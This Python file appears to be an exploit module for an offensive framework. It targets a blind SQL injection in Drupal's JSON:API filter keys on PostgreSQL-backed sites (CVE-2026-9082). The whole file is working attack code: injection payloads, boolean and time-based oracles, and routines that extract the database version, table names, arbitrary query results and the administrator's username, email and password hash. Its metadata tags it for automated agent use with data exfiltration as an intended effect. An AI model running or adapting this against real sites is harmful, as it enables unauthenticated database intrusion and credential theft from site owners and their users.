#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-9082 — Drupal PostgreSQL JSON:API filter-key blind SQLi."""

import time
from typing import List, Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_CANARY_A = "CVE20269082a"
_CANARY_B = "CVE20269082b"
_CANARY_C = "CVE20269082c"


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Drupal CVE-2026-9082 PostgreSQL JSON:API SQLi",
        "description": (
            "Exploits CVE-2026-9082 (SA-CORE-2026-004): blind SQL injection via "
            "JSON:API filter value array keys on PostgreSQL-backed Drupal. "
            "Actions: test | pg_version | dbinfo | admin | tables | query. "
            "Uses /**/ separators and balanced parentheses (no -- comments). "
            "Fixed in 10.4.10 / 10.5.10 / 10.6.9 / 11.1.10 / 11.2.12 / 11.3.10."
        ),
        "author": ["Michael Maturi", "7h30th3r0n3", "KittySploit Team"],
        "cve": ["CVE-2026-9082"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9082",
            "https://www.drupal.org/sa-core-2026-004",
            "https://slcyber.io/research-center/keys-to-the-kingdom-anonymous-sql-injection-in-drupal-core-cve-2026-9082/",
            "https://www.yeswehack.com/news/cve-2026-9082-postgresql-drupal",
        ],
        "tags": [
            "drupal",
            "jsonapi",
            "sqli",
            "blind",
            "postgresql",
            "unauthenticated",
            "cve-2026-9082",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 80,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["drupal"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/jsonapi"],
                "param_any": ["filter"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(80, "Drupal HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "Drupal base path", required=False)
    resource_type = OptString(
        "",
        "JSON:API resource type (empty = auto)",
        required=False,
    )
    action = OptString(
        "test",
        "Action: test | pg_version | dbinfo | admin | tables | query",
        required=False,
    )
    method = OptString(
        "bool",
        "Extraction oracle: bool | time",
        required=False,
    )
    sleep_seconds = OptInteger(2, "pg_sleep for time oracle", required=False, advanced=True)
    sql = OptString(
        "SELECT current_user",
        "SQL scalar for action=query (spaces OK; converted to /**/)",
        required=False,
    )
    max_length = OptInteger(120, "Max chars to extract", required=False, advanced=True)
    table_limit = OptInteger(20, "Max tables for action=tables", required=False, advanced=True)

    def __init__(self):
        super().__init__()
        self._rt = ""

    def _timeout(self) -> int:
        sleep_s = max(int(self.sleep_seconds or 2), 1)
        return max(int(self.timeout or 30), sleep_s * 3 + 15)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/")

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _build_qs(field: str, injection_key: str) -> str:
        ek = quote(injection_key, safe="")
        return (
            f"filter%5Bsqli%5D%5Bcondition%5D%5Bpath%5D={quote(field, safe='')}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Boperator%5D=IN"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B0%5D={_CANARY_A}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B1%5D={_CANARY_B}"
            f"&filter%5Bsqli%5D%5Bcondition%5D%5Bvalue%5D%5B{ek}%5D={_CANARY_C}"
        )

    def _inject(
        self, injection_key: str, field: str = "title"
    ) -> Tuple[Optional[object], float]:
        qs = self._build_qs(field, injection_key)
        path = self._path(f"/jsonapi/{self._rt}?{qs}")
        start = time.perf_counter()
        response = self.http_request(
            method="GET",
            path=path,
            headers={"Accept": "application/vnd.api+json"},
            timeout=self._timeout(),
            allow_redirects=False,
        )
        return response, time.perf_counter() - start

    def _discover_rt(self) -> str:
        forced = str(self.resource_type or "").strip().strip("/")
        if forced:
            return forced
        response = self.http_request(
            method="GET",
            path=self._path("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if response and response.status_code == 200:
            try:
                links = (response.json() or {}).get("links") or {}
            except Exception:
                links = {}
            for key in links:
                if str(key).startswith("node--"):
                    return str(key).replace("--", "/")
        for candidate in ("node/article", "node/page", "node/basic_page"):
            response = self.http_request(
                method="GET",
                path=self._path(f"/jsonapi/{candidate}"),
                headers={"Accept": "application/vnd.api+json"},
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if response and response.status_code == 200:
                return candidate
        return ""

    def _rows(self, response) -> int:
        if not response:
            return -1
        try:
            data = response.json() or {}
            rows = data.get("data")
            return len(rows) if isinstance(rows, list) else -1
        except Exception:
            return -1

    def _oracle_bool(self, condition_sql: str) -> bool:
        # condition_sql already uses /**/ separators
        key = f"1))/**/OR/**/({condition_sql})/**/AND/**/((1=1"
        resp, _ = self._inject(key)
        return self._rows(resp) > 0

    def _oracle_time(self, condition_sql: str) -> bool:
        sleep_s = max(int(self.sleep_seconds or 2), 1)
        key = (
            f"1))/**/OR/**/(SELECT/**/CASE/**/WHEN/**/({condition_sql})"
            f"/**/THEN/**/pg_sleep({sleep_s})/**/ELSE/**/pg_sleep(0)"
            f"/**/END)::text=((chr(49)"
        )
        _, elapsed = self._inject(key)
        return elapsed >= (sleep_s - 0.5)

    def _oracle(self, condition_sql: str) -> bool:
        method = str(self.method or "bool").strip().lower()
        if method == "time":
            return self._oracle_time(condition_sql)
        return self._oracle_bool(condition_sql)

    def _confirm(self) -> bool:
        method = str(self.method or "bool").strip().lower()
        if method == "time":
            sleep_s = max(int(self.sleep_seconds or 2), 1)
            _, baseline = self._inject("2")
            key = (
                f"1))/**/OR/**/(SELECT/**/CASE/**/WHEN/**/current_user/**/IS/**/NOT/**/NULL"
                f"/**/THEN/**/pg_sleep({sleep_s})/**/ELSE/**/pg_sleep(0)"
                f"/**/END)::text=((chr(49)"
            )
            _, injected = self._inject(key)
            ok = (injected - baseline) >= 2.5
            print_info(f"baseline={baseline:.2f}s injected={injected:.2f}s")
            return ok

        resp_t, _ = self._inject("1))/**/OR/**/TRUE/**/OR/**/1=1/**/OR/**/((1=1")
        resp_f, _ = self._inject("1))/**/OR/**/FALSE/**/AND/**/1=2/**/OR/**/((1=2")
        n_t, n_f = self._rows(resp_t), self._rows(resp_f)
        print_info(f"OR TRUE={n_t} OR FALSE={n_f}")
        return n_t > n_f and n_t >= 0 and n_f >= 0

    def _extract_char(self, sql: str, pos: int) -> Optional[str]:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(({sql}),{pos},1))>{mid}"
            if self._oracle(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else None

    def _extract_string(self, sql: str, max_len: Optional[int] = None) -> str:
        limit = int(max_len if max_len is not None else (self.max_length or 120))
        # Normalize spaces for PDO-safe injection style from PoC
        sql_n = sql.replace(" ", "/**/")
        out = []
        spaces = 0
        for pos in range(1, limit + 1):
            ch = self._extract_char(sql_n, pos)
            if ch is None or ch == "\x00":
                break
            out.append(ch)
            print_info(f"  [{pos}] {''.join(out)}")
            if ch == " ":
                spaces += 1
                if spaces >= 3:
                    return "".join(out).rstrip()
            else:
                spaces = 0
        return "".join(out)

    def run(self):
        action = str(self.action or "test").strip().lower()
        print_status(f"CVE-2026-9082 Drupal PostgreSQL SQLi — action={action}")

        self._rt = self._discover_rt()
        if not self._rt:
            print_error("No JSON:API node resource type found")
            return False
        print_info(f"Resource type: {self._rt}")

        if action == "test":
            if self._confirm():
                print_warning("SQLi confirmed (PostgreSQL JSON:API filter keys)")
                return True
            print_error("Not vulnerable / not PostgreSQL / empty dataset")
            return False

        if not self._confirm():
            print_error("Oracle failed — aborting extraction")
            return False
        print_warning("Oracle OK — extracting…")

        if action == "pg_version":
            ver = self._extract_string("SELECT version()")
            print_success(f"PostgreSQL: {ver}")
            return bool(ver)

        if action == "dbinfo":
            user = self._extract_string("SELECT current_user")
            db = self._extract_string("SELECT current_database()")
            print_success(f"user={user}")
            print_success(f"database={db}")
            return bool(user or db)

        if action == "admin":
            name = self._extract_string(
                "SELECT name FROM users_field_data WHERE uid=1",
                max_len=64,
            )
            mail = self._extract_string(
                "SELECT mail FROM users_field_data WHERE uid=1",
                max_len=80,
            )
            passwd = self._extract_string(
                "SELECT pass FROM users_field_data WHERE uid=1",
                max_len=100,
            )
            print_success(f"uid=1 name={name}")
            print_success(f"uid=1 mail={mail}")
            print_success(f"uid=1 pass={passwd}")
            return bool(name or mail or passwd)

        if action == "tables":
            limit = max(int(self.table_limit or 20), 1)
            sql = (
                f"SELECT string_agg(tablename,',') FROM ("
                f"SELECT tablename FROM pg_tables WHERE schemaname='public' "
                f"ORDER BY tablename LIMIT {limit}) AS t"
            )
            raw = self._extract_string(sql, max_len=2000)
            if raw:
                tables = [t.strip() for t in raw.split(",") if t.strip()]
                print_success(f"{len(tables)} tables:")
                for i, name in enumerate(tables, 1):
                    print_info(f"  {i}. {name}")
                return True
            print_error("No tables extracted")
            return False

        if action == "query":
            raw_sql = str(self.sql or "SELECT current_user").strip()
            if not raw_sql:
                print_error("Set sql for action=query")
                return False
            result = self._extract_string(raw_sql)
            print_success(f"Result: {result}")
            return bool(result)

        print_error(f"Unknown action: {action}")
        print_info("Valid: test | pg_version | dbinfo | admin | tables | query")
        return False
